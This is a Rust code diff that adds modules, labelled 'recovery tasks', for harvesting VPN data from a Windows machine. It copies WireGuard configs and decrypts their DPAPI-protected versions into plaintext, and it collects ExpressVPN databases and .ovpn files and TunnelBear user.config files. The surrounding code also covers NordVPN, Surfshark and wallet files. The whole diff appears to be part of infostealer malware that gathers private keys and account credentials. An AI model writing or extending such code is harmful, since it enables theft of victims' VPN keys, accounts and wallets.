@@ -32,6 +32,9 @@ pub fn vpn_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
         Arc::new(SurfsharkTask {
             source: ctx.roaming_data_dir.join("Surfshark"),
         }),
+        Arc::new(WireGuardTask),
+        Arc::new(ExpressVpnTask),
+        Arc::new(TunnelBearTask),
     ]
 }
 
@@ -92,6 +95,186 @@ impl RecoveryTask for NordVpnTask {
 
         let artifact = write_text_artifact(ctx, &self.label(), "nordvpn-account.log", &log).await?;
         Ok(vec![artifact])
+    }
+}
+
+struct WireGuardTask;
+
+#[async_trait]
+impl RecoveryTask for WireGuardTask {
+    fn label(&self) -> String {
+        "WireGuard Configs".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::VPNs
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let paths = vec![
+            PathBuf::from(r"C:\Program Files\WireGuard\Data\Configurations"),
+            ctx.local_data_dir.join("WireGuard").join("Configurations"),
+        ];
+
+        let output_dir = vpn_output_dir(ctx, &self.label()).await?;
+
+        for base in paths {
+            if !base.exists() {
+                continue;
+            }
+
+            let mut entries = match fs::read_dir(&base).await {
+                Ok(e) => e,
+                Err(_) => continue,
+            };
+
+            while let Some(entry) = entries.next_entry().await? {
+                let path = entry.path();
+                if !path.is_file() {
+                    continue;
+                }
+
+                let extension = path.extension().and_then(|e| e.to_str()).unwrap_or("");
+                let file_name = path
+                    .file_stem()
+                    .and_then(|s| s.to_str())
+                    .unwrap_or("unknown");
+
+                if extension == "conf" {
+                    // Plaintext config
+                    let dest = output_dir.join(format!("{}.conf", file_name));
+                    match fs::copy(&path, &dest).await {
+                        Ok(_) => {
+                            if let Ok(meta) = fs::metadata(&dest).await {
+                                artifacts.push(RecoveryArtifact {
+                                    label: self.label(),
+                                    path: dest,
+                                    size_bytes: meta.len(),
+                                    modified: meta.modified().ok(),
+                                });
+                            }
+                        }
+                        Err(_) => continue,
+                    }
+                } else if extension == "dpapi" && path.to_string_lossy().ends_with(".conf.dpapi") {
+                    // Encrypted config
+                    if let Ok(encrypted_data) = fs::read(&path).await {
+                        if let Some(decrypted) = dpapi_unprotect(&encrypted_data) {
+                            let dest = output_dir.join(format!("{}.conf", file_name));
+                            if let Ok(mut file) = fs::File::create(&dest).await {
+                                if file.write_all(&decrypted).await.is_ok() {
+                                    if let Ok(meta) = fs::metadata(&dest).await {
+                                        artifacts.push(RecoveryArtifact {
+                                            label: self.label(),
+                                            path: dest,
+                                            size_bytes: meta.len(),
+                                            modified: meta.modified().ok(),
+                                        });
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+struct ExpressVpnTask;
+
+#[async_trait]
+impl RecoveryTask for ExpressVpnTask {
+    fn label(&self) -> String {
+        "ExpressVPN Data".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::VPNs
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let base = ctx.local_data_dir.join("ExpressVPN");
+        if !base.exists() {
+            return Ok(artifacts);
+        }
+
+        let output_dir = vpn_output_dir(ctx, &self.label()).await?;
+        
+        // Walk specifically looking for DB files or user data
+        for entry in WalkDir::new(base).into_iter().filter_map(|e| e.ok()) {
+            if entry.file_type().is_file() {
+                let name = entry.file_name().to_string_lossy();
+                if name == "data.db" || name == "database.db" || name.ends_with(".ovpn") {
+                    // Use parent hash to prevent collisions if multiple files have the same name
+                    let parent_hash = path_hash(entry.path().parent().unwrap_or(Path::new(".")));
+                    let unique_name = format!("{}_{}", parent_hash, name);
+                    let dest = output_dir.join(unique_name);
+
+                    match fs::copy(entry.path(), &dest).await {
+                        Ok(_) => {
+                            if let Ok(meta) = fs::metadata(&dest).await {
+                                artifacts.push(RecoveryArtifact {
+                                    label: self.label(),
+                                    path: dest,
+                                    size_bytes: meta.len(),
+                                    modified: meta.modified().ok(),
+                                });
+                            }
+                        }
+                        Err(_) => continue,
+                    }
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+struct TunnelBearTask;
+
+#[async_trait]
+impl RecoveryTask for TunnelBearTask {
+    fn label(&self) -> String {
+        "TunnelBear Configs".to_string()
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::VPNs
+    }
+
+    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+        let base = ctx.local_data_dir.join("TunnelBear");
+        let output_dir = vpn_output_dir(ctx, &self.label()).await?;
+
+        let configs = find_dotnet_based_configs(&base, "TunnelBear.exe").await?;
+        for config_path in configs {
+            let parent_hash = path_hash(config_path.parent().unwrap_or(Path::new(".")));
+            let dest_name = format!("{}_user.config", parent_hash);
+            let dest = output_dir.join(dest_name);
+
+            match fs::copy(&config_path, &dest).await {
+                Ok(_) => {
+                    if let Ok(meta) = fs::metadata(&dest).await {
+                        artifacts.push(RecoveryArtifact {
+                            label: self.label(),
+                            path: dest,
+                            size_bytes: meta.len(),
+                            modified: meta.modified().ok(),
+                        });
+                    }
+                }
+                Err(_) => continue,
+            }
+        }
+
+        Ok(artifacts)
     }
 }
 
@@ -406,4 +589,35 @@ async fn copy_wallet_file(
         modified: meta.modified().ok(),
     });
     Ok(())
+}
+
+async fn find_dotnet_based_configs(
+    base_dir: &Path,
+    exe_prefix: &str,
+) -> Result<Vec<PathBuf>, RecoveryError> {
+    let mut config_paths = Vec::new();
+    if !base_dir.exists() {
+        return Ok(config_paths);
+    }
+
+    let mut top_entries = fs::read_dir(base_dir).await?;
+    while let Some(top_entry) = top_entries.next_entry().await? {
+        let name = top_entry.file_name().to_string_lossy().to_string();
+        if !name.starts_with(exe_prefix) {
+            continue;
+        }
+        
+        let mut version_entries = match fs::read_dir(top_entry.path()).await {
+            Ok(e) => e,
+            Err(_) => continue,
+        };
+
+        while let Some(version_entry) = version_entries.next_entry().await? {
+            let config_path = version_entry.path().join("user.config");
+            if config_path.exists() {
+                config_paths.push(config_path);
+            }
+        }
+    }
+    Ok(config_paths)
 }
